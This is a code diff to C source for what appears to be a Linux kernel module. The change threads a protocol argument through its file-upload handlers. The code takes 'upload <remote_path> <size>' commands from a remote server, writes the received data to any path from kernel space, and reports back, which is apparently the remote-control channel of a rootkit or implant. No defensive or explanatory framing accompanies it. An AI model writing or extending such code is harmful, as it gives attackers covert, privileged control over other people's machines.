@@ -13,7 +13,7 @@ char *upload_path = NULL;
 long upload_size = 0;
 long upload_received = 0;
 
-int handle_upload_chunk(const char *data, size_t len) {
+int handle_upload_chunk(const char *data, size_t len, enum Protocol protocol) {
     if (!receiving_file || !upload_buffer) {
         ERR_MSG("handle_upload_chunk: not receiving file, aborting chunk\n");
         return -EINVAL;
@@ -35,15 +35,15 @@ int handle_upload_chunk(const char *data, size_t len) {
         struct file *filp = filp_open(upload_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
         if (IS_ERR(filp)) {
             ERR_MSG("handle_upload_chunk: failed to open %s\n", upload_path);
-            send_to_server("Failed to open file.\n");
+            send_to_server(protocol, "Failed to open file.\n");
         } else {
             ssize_t written = kernel_write(filp, upload_buffer, upload_size, &filp->f_pos);
             if (written != upload_size) {
                 ERR_MSG("handle_upload_chunk: partial write (%zd/%ld)\n", written, upload_size);
-                send_to_server("Partial or failed file write.\n");
+                send_to_server(protocol, "Partial or failed file write.\n");
             } else {
                 DBG_MSG("handle_upload_chunk: wrote %ld bytes to %s\n", upload_size, upload_path);
-                send_to_server("File written successfully.\n");
+                send_to_server(protocol, "File written successfully.\n");
             }
             filp_close(filp, NULL);
         }
@@ -84,9 +84,13 @@ int start_upload(const char *path, long size) {
     return 0;
 }
 
-int upload_handler(char *args) {
+int upload_handler(char *args, enum Protocol protocol) {
+    if (protocol != TCP) {
+        DBG_MSG("warning: upload will be over TCP.\n");
+    }
+
     if (!args) {
-        send_to_server("Usage: upload <remote_path> <size>\n");
+        send_to_server(protocol, "Usage: upload <remote_path> <size>\n");
         return -EINVAL;
     }
 
@@ -94,22 +98,22 @@ int upload_handler(char *args) {
     char *size_str = args;
 
     if (!path_str || !size_str) {
-        send_to_server("Usage: upload <remote_path> <size>\n");
+        send_to_server(protocol, "Usage: upload <remote_path> <size>\n");
         return -EINVAL;
     }
 
     long size;
     if (kstrtol(size_str, 10, &size) < 0 || size <= 0) {
-        send_to_server("Invalid file size.\n");
+        send_to_server(protocol, "Invalid file size.\n");
         return -EINVAL;
     }
 
     int ret = start_upload(path_str, size);
     if (ret < 0) {
-        send_to_server("Failed to initiate upload.\n");
+        send_to_server(protocol, "Failed to initiate upload.\n");
         return ret;
     }
 
-    send_to_server("READY");
+    send_to_server(protocol, "READY");
     return 0;
 }
